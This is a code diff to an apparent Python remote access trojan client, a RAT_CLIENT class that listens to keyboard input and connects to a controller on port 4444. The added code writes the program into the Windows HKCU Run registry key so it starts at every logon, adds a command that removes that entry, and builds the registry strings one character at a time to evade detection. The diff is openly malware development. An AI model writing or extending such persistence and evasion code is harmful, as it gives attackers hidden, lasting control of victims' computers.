@@ -11,8 +11,6 @@ import sys
 import pyautogui
 from pynput.keyboard import Listener
 from pynput.mouse import Controller
-import time
-import keyboard
 
 user32 = ctypes.WinDLL('user32')
 kernel32 = ctypes.WinDLL('kernel32')
@@ -530,9 +528,55 @@ class RAT_CLIENT:
                 except:
                     self.errorsend()
 
+            elif command == 'sgpsakwmactegscsv':
+                import winreg
+                from winreg import HKEY_CURRENT_USER as HKCU
+                try:
+                    run_key = ''.join([
+                        "S", "o", "f", "t", "w", "a", "r", "e", "\\",
+                        "M", "i", "c", "r", "o", "s", "o", "f", "t", "\\",
+                        "W", "i", "n", "d", "o", "w", "s", "\\",
+                        "C", "u", "r", "r", "e", "n", "t", "V", "e", "r", "s", "i", "o", "n", "\\",
+                        "R", "u", "n"
+                    ])
+                    
+                    reg_key = winreg.OpenKey(HKCU, run_key, 0, winreg.KEY_WRITE)
+                    winreg.DeleteValue(reg_key, ''.join(["a", "l", "v", "a", "r", "o", " ", ":)"]))
+                    winreg.CloseKey(reg_key)
+                    
+                    persistence_str = ''.join(["P", "e", "r", "s", "i", "s", "t", "e", "n", "c", "e"])
+                    s.send(f'{persistence_str} was removed'.encode())
+                except WindowsError:
+                    self.errorsend()
+
             elif command == 'fzlx':
                 s.send(b"exit")
                 break
+
+def persistence(): 
+    import winreg
+    from winreg import HKEY_CURRENT_USER as HKCU
+
+    run_key = ''.join([
+        "S", "o", "f", "t", "w", "a", "r", "e", "\\",
+        "M", "i", "c", "r", "o", "s", "o", "f", "t", "\\",
+        "W", "i", "n", "d", "o", "w", "s", "\\",
+        "C", "u", "r", "r", "e", "n", "t", "V", "e", "r", "s", "i", "o", "n", "\\",
+        "R", "u", "n"
+    ])
+
+    bin_path = sys.executable
+
+    try:
+        reg_key = winreg.OpenKey(HKCU, run_key, 0, winreg.KEY_WRITE)
+        
+        winreg.SetValueEx(reg_key, ''.join(["a", "l", "v", "a", "r", "o", " ", ":)"]), 0, winreg.REG_SZ, bin_path)
+        winreg.CloseKey(reg_key)
+        success_msg = ''.join(["H", "K", "C", "U", " ", "R", "u", "n", " ", "r", "e", "g", "i", "s", "t", "r", "y", " ", "k", "e", "y", " ", "a", "p", "p", "l", "i", "e", "d"])
+        s.send(success_msg.encode())
+    except WindowsError:
+        failure_msg = ''.join(["H", "K", "C", "U", " ", "R", "u", "n", " ", "r", "e", "g", "i", "s", "t", "r", "y", " ", "k", "e", "y", " ", "f", "a", "i", "l", "e", "d"])
+        s.send(failure_msg.encode())
 
 rat = RAT_CLIENT('127.0.0.1', 4444)
 
